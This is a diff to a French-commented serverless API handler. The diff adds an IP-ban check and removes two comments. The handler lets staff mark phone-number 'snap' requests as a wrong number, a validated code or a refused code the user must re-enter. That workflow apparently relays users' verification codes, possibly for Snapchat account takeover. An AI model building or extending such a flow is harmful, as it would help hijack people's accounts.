@@ -1,4 +1,5 @@
 import { neon } from '@neondatabase/serverless';
+import { checkBannedIP } from './middleware.js';
 
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -6,6 +7,10 @@ export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ success: false });
 
   try {
+    // ─── Vérification BAN IP (aussi pour le staff, par sécurité) ───
+    const blocked = await checkBannedIP(req, res);
+    if (blocked) return blocked;
+
     const { action, phone, length, secret } = req.body;
     if (secret !== process.env.STAFF_SECRET) {
       return res.status(401).json({ success: false, message: 'Unauthorized' });
@@ -31,13 +36,11 @@ export default async function handler(req, res) {
       return res.status(200).json({ success: true, message: 'Wrong number signalé' });
     }
 
-    // NOUVEAU : True Code (staff valide le code)
     if (action === 'true_code') {
       await sql`UPDATE snap_requests SET status = 'completed' WHERE phone = ${phone}`;
       return res.status(200).json({ success: true, message: 'Code validé par le staff' });
     }
 
-    // NOUVEAU : False Code (staff refuse le code, l'utilisateur doit ressaisir)
     if (action === 'false_code') {
       await sql`UPDATE snap_requests SET status = 'retry_code' WHERE phone = ${phone}`;
       return res.status(200).json({ success: true, message: 'Code refusé, utilisateur invité à ressaisir' });
